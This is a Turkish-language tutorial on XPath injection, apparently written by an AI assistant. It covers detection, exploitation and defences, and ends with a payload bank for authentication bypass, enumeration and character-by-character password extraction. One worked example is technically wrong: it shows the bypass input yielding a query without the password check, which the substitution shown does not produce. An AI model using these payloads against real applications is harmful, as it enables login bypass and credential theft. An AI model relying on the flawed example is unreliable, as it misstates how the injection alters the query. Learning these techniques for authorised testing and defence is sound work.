### **XPath Injection Zafiyeti: Tespit ve İstismar Rehberi**

**XPath Injection**, web uygulamalarında XML tabanlı veri kaynakları üzerinde çalışan XPath ifadelerinin kötüye kullanılmasıyla meydana gelir. Bu zafiyet, saldırganın XML veritabanına yetkisiz erişim sağlamasına, hassas bilgilere ulaşmasına veya veri manipülasyonu yapmasına olanak tanır.

---

### **1. XPath Injection Nedir?**
- **Tanım**: Uygulamada kullanıcıdan alınan girdi, güvenlik kontrolleri olmadan XPath sorgularına dahil ediliyorsa, saldırgan bu girdiyi manipüle ederek sorgunun mantığını değiştirebilir.
- **Tehlikeleri**:
  - XML tabanlı veritabanına yetkisiz erişim.
  - Kullanıcı bilgilerini ele geçirme (örn. kullanıcı adı ve parola).
  - Veri sızdırma veya silme.

---

### **2. XPath Zafiyetinin Tespiti**
#### **2.1. Potansiyel Giriş Noktaları**
XPath Injection genellikle şu durumlarda ortaya çıkar:
- **Login Formları**: Kullanıcı adı ve parola doğrulama sırasında.
- **Arama Kutuları**: XML tabanlı sorgularla çalışan veri tabanlarında.
- **Filtreleme Sistemleri**: Örneğin, bir kullanıcı listesini filtreleme veya sıralama.

#### **2.2. Belirtiler**
- Beklenmeyen çıktı dönen XML sorguları.
- Hata mesajlarında XPath ifadelerinin görünmesi.
- Kullanıcı girdisinin yansıtıldığı bir XML çıktısı.

#### **2.3. Test için Kullanılan Payloadlar**
XPath Injection tespiti için aşağıdaki payloadlar kullanılabilir:

1. **Boolean Testleri**:
   ```plaintext
   ' or '1'='1
   " or "1"="1
   ' or 1=1 or 'a'='a
   ```

2. **XPath Error-Based Payload**:
   ```plaintext
   ' and count(//user)=0
   ' and count(/user)=1
   ```

3. **Time-Based Test**:
   Eğer XML veritabanı zaman tabanlı işlemleri destekliyorsa, bu yöntem kullanılabilir.

#### **2.4. Araçlar**
- **Burp Suite**: HTTP isteklerini yakalayarak XPath sorgularını test etmek.
- **OWASP ZAP**: Otomatik tarama ve manuel testler için.
- **Postman**: API isteklerini düzenleyerek XPath Injection testleri yapmak.

---

### **3. XPath Injection İstismarı**
#### **3.1. Kimlik Doğrulama Atlatma**
Saldırganın amacı, login formunu baypas ederek sisteme erişim sağlamaktır.

**Örnek Sorgu**:
```xml
//users/user[username/text()='admin' and password/text()='password']
```

**Manipüle Edilmiş Girdi**:
```plaintext
' or '1'='1
```

**Sonuç Sorgu**:
```xml
//users/user[username/text()='admin' or '1'='1']
```
Bu, tüm kullanıcıların listesini döndürebilir ve kimlik doğrulamayı atlatır.

---

#### **3.2. Hassas Veri Çalma**
XPath ifadelerini manipüle ederek XML veritabanındaki hassas bilgileri çalabilirsiniz.

**Örnek Payload**:
```plaintext
' or contains(name, 'admin') or '1'='1
```
Bu payload, adı "admin" olan bir kullanıcıyı sorgular ve döner.

---

#### **3.3. Veri Keşfi (Enumeration)**
XML veritabanındaki veri yapısını anlamak için aşağıdaki teknikler kullanılabilir:

- **Element Sayısını Bulma**:
   ```plaintext
   ' or count(//user)=2 or '1'='1
   ```

- **Kullanıcı Adlarını Çıkarma**:
   ```plaintext
   ' or username/text()='admin' or '1'='1
   ```

#### **3.4. XPath Fonksiyonlarının Kullanımı**
XPath fonksiyonları, veri keşfi ve istismar için kullanılabilir:

- **starts-with()**:
   ```plaintext
   ' or starts-with(password/text(), 'a') or '1'='1
   ```
   Bu, parolanın "a" harfiyle başlayıp başlamadığını kontrol eder.

- **substring()**:
   ```plaintext
   ' or substring(password/text(), 1, 1)='a' or '1'='1
   ```
   Bu, parolanın ilk karakterini kontrol eder.

---

### **4. Korunma Yöntemleri**
#### **4.1. Kullanıcı Girdisi Doğrulama**
- **Beyaz Liste**: Yalnızca belirli giriş formatlarına izin verin.
- **Kaçış Mekanizması**: XPath özel karakterlerini kaçış karakterleriyle değiştirin:
  - `'` yerine `&apos;`
  - `"` yerine `&quot;`

#### **4.2. Parametrik Sorgular**
- SQL Injection'a benzer şekilde, XPath sorgularında parametrik ifadeler kullanılmalıdır:
  ```java
  String xpath = "//users/user[username/text()=$username and password/text()=$password]";
  ```

#### **4.3. XML İşleyicisini Güncelleme**
Modern XML işleyicileri kullanarak harici varlık işlemlerini (XXE) ve XPath Injection'u önlemek için güncellemeler yapılmalıdır.

#### **4.4. Hata Mesajlarını Gizleme**
Hata mesajlarında XPath ifadelerinin görünmesini engelleyin.

---

### **5. Araçlar ve Teknikler**

| **Araç**         | **Açıklama**                                  |
|-------------------|----------------------------------------------|
| **Burp Suite**    | HTTP isteği manipülasyonu ve injection testi. |
| **OWASP ZAP**     | XPath Injection tespiti ve manuel test.       |
| **Postman**       | API isteklerini test etmek için kullanılabilir. |
| **XMLSpy**        | XML yapısını analiz etmek için kullanılır.     |

---

### **6. XPath Injection Payload Bankası**

#### **Kimlik Doğrulama Baypası**
```plaintext
' or '1'='1
" or "1"="1
' or 1=1 or 'a'='a
```

#### **Veri Çekme**
```plaintext
' or contains(name, 'admin') or '1'='1
' or substring(password, 1, 1)='a' or '1'='1
' or count(//user)=1 or '1'='1
```

#### **Error-Based XPath**
```plaintext
' and count(//user)=0
' and count(/user)=1
```

---

Bu rehber, XPath Injection tespiti ve istismarı için kapsamlı bir yol haritası sunmaktadır. Daha fazla detay ve senaryo üzerinde çalışmak isterseniz, örneklerle destek sağlayabilirim.
